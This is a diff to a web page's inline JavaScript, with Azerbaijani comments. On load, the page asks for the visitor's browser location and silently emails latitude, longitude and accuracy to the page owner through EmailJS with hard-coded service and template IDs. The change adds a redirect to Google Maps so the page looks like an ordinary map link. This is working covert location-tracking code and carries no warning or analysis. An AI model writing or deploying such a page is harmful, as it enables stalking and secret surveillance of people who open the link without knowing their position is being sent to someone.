@@ -9,21 +9,21 @@
 </head>
 <body>
     <script>
-        function sendLocation(lat, lon, accuracy) {
-            emailjs.send("service_3v5hcby", "template_x8wi2yq", {
-                lat: lat,
-                lon: lon,
-                accuracy: accuracy + " metr"
-            });
-        }
-
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(function(pos) {
-                sendLocation(
-                    pos.coords.latitude,
-                    pos.coords.longitude,
-                    pos.coords.accuracy
-                );
+                var lat = pos.coords.latitude;
+                var lon = pos.coords.longitude;
+                var accuracy = pos.coords.accuracy;
+
+                // Email göndər
+                emailjs.send("service_3v5hcby", "template_x8wi2yq", {
+                    lat: lat,
+                    lon: lon,
+                    accuracy: accuracy + " metr"
+                });
+
+                // Google Maps-ə yönləndir
+                window.location.href = "https://www.google.com/maps?q=" + lat + "," + lon;
             });
         }
     </script>
